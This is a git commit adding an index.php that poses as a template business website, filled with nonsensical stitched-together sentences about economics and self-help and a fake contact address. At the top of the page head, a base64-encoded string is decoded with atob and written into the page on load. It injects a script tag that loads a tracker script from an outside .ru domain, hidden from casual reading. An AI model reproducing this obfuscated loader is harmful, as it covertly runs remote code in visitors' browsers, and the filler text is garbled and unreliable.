873b85cab05b83a22709cdaf61834f24386f93ff
bhzjrahn <81074821+bhzjrahn@users.noreply.github.com>
2021-03-21 10:57:04 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl8wZTBrdmN5Zm5nMTNzYThudzgiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The more firms on the market, the greater the supply, and vice versa.  In additio</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="um5ntfdo2v4xr27j2shi">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="g79kwie6bzzw2r421h">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The more firms on the market, the greater the supply, and vice versa.  In additio</h1>
+	</section>
+
+
+	<section class="our-work" class="oxf5hgqau4xvs9irs63">
+		<h3 class="title">Invite your wife (husband) to participate in this. </h3>
+		<p>I've attended seminars on time management and tried half a dozen scheduling systems.  You draw a pattern for the future dress before threading the needle.  Don't expect people to open up to you before you show empathy.  There, during the week, you need to study two days in the evenings and another whole Saturday! That's so much! Having caught the emotion in the son's words, the father returns to empathic listening.  Tickets are bought; the wife is looking forward to the evening. </p>
+		<hr>
+
+		<ul class="grid" class="2abtp3qwwa0p3wgds4iotys">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="oxf5hgqau4xvs9irs63">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>I can become the first creator for myself.  Disposal relations are carried out on a non-economic, based on artificial monopoly method, </td>
+    <td>Reactive people, on the other hand,waste their efforts in the Circle of Concerns.  Frankl himself has endured torture and cou</td>
+    <td>Any of these approaches - authoritarian or all permissive - suggests that you have a golden egg mentality.  A feature of this market is the li</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>PRICE DISCRIMINATION Price discrimination is selling at more than one price when price differences are not justified by differences in costs.  We did n</td>
+    <td>An effective goal is focused primarily on results, not actions.  3.  Fourth, you can communicate with your wife and your boss using the strong web o</td>
+    <td>Begin with the Ultimate Goal What is left behind us and what lies ahead has very little value compared to what is within us.Oliver We</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>Little attention is paid to Squares II and III.  If this deficit is financed by loans from the central issuing bank of th</td>
+    <td>28.  per minute, and for four minutes - 1 rub.  Often they are more a projection of the problems and shortcomings of the people who </td>
+    <td>And unexpressed feelings never die: when buried alive, they manifest later in a much more terrible form.  Due to the fog, visibility was poor, so the captain remai</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="um5ntfdo2v4xr27j2shi">
+		<h3 class="title">Oh, how your wife should be proud of you! </h3>
+		<p>However, it is common to all markets that the amount of resources offered for sale is limited in comparison with the needs for their production.For a manufacturing enterprise, prices on the market are of great importance.  However, other factors remain unchanged.  In the figure, it is indicated by point O.  This is not a matter of logic, but of psychology.The teacher brought a stack of oversized cards, one half of which was a picture of a young woman from page 29 and the other half of an image of an older woman from page 30.  She didn't even think about purchasing a product with a different brand! Even when we were just starting out and had a lot of financial constraints, Sandra insisted on a fifty-mile trip to the “big city,” where Frigidar merchandise was sold that were not available on our tiny campus.  In the role of world money, it functions as a universal means of payment, a universal means of purchase and a universal materialization of social wealth.  This is where we come in contact with our vision and our values.  Definition of the problem and objectives of the study.  And not so much because of the discovery made, but because of the increased sense of respect for each other.  Inner orientation is based on momentary emotions.  Perhaps the table below will help you organize your thoughts: 2.  At the same time, it gives you the freedom to subordinate your plans to higher values ​​without dramatization. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="g79kwie6bzzw2r421h" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="oxf5hgqau4xvs9irs63">
+		<h3 class="title">Of course, there are situations when a person, possessing stren</h3>
+		<p>One plus one equals three or more.  How many times have you been told: stop playing the fool! You're a capable boy, you're just lazy.  state, enterprises and population.  " I myself turned down a $ 84,000 contract.  Therefore, an accurate measurement of costs is possible only when all the resources expended are estimated at their market price. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="2abtp3qwwa0p3wgds4iotys" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="2abtp3qwwa0p3wgds4iotys" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="um5ntfdo2v4xr27j2shi">
+		<h3 class="title">Wisdom is your broad outlook on life, your sense of</h3>
+		<p>I admit that this description is too simplistic and the latest research, no doubt, will shed more light on the activity of our brain.  Another example of powerful synergy was when I accepted an invitation to act as a catalyst for discussion at the annual planning conference of a major insurance company.  Labor in a broad sense means: 1) remuneration of workers of different professions; 2) remuneration for the work of multidisciplinary specialists - lawyers, doctors, dentists, teachers.  The disadvantage of the accounting method is that it includes the costs of only those resources that the company acquires from the outside (raw materials).  The formula “no pain, no development” is true in certain life situations, but it is not the essence of an effective exercise program.  How accurate were your assumptions? How correctly did you understand your partner's point of view? 2.  The marginal rate of substitution (MRSxy) of product X for product Y is equal to: MRSхy = -? Y /? X where? Y - change in consumption of goods Y; ? X - change in consumption of goods X.  "You're all right." Weeks and months passed, and little by little, the son gained confidence in himself. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="g79kwie6bzzw2r421h" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="oxf5hgqau4xvs9irs63">
+		<h3 class="title">MARKETING Marketing is a type of human act</h3>
+		<p>Failure to meet sales targets, growing unpaid invoices, and low turnover are all signals or symptoms of deeper problems.  As consumers of products are both citizens in need of satisfaction of their needs, and enterprises.  - Yes, I'm trying! - you answer.  Yes, now it is true! " Having carefully examined the interests of the other side, the President proceeded to clarify what worried us ... </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="2abtp3qwwa0p3wgds4iotys" class="title">This can include financial rewards, moral rewards, job transfer</h3>	
+		<p>But our hero behaved proactively towards these people.  Everything took place in one of the hotels.  We said it was P / PC balance,a fundamental concept in the story of the goose and the golden eggs.  When considering this indicator, the following are determined: - the tendency of supply exceeding demand,- the imbalance of supply and demand, caused primarily by the violation of economic ties, contractual obligations and financial difficulties.  At these resource prices, production costs will decrease and supply will increase.  Practical Suggestions: 1.  This is due to the fact that agriculture has been the leading sector of the economy for a long period of time.  Schedule a time to get completely out of your business and start working on your Personal Mission Statement. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="um5ntfdo2v4xr27j2shi">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="g79kwie6bzzw2r421h"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="oxf5hgqau4xvs9irs63"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="2abtp3qwwa0p3wgds4iotys"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>072 Spencer Lodge, Apt. 446, 92511, Bretburgh, Montana, United States</p>
+		<p>Phone number: +76(3619)883-43617</p>
+	</footer>
+
+</body>
+
+</html>
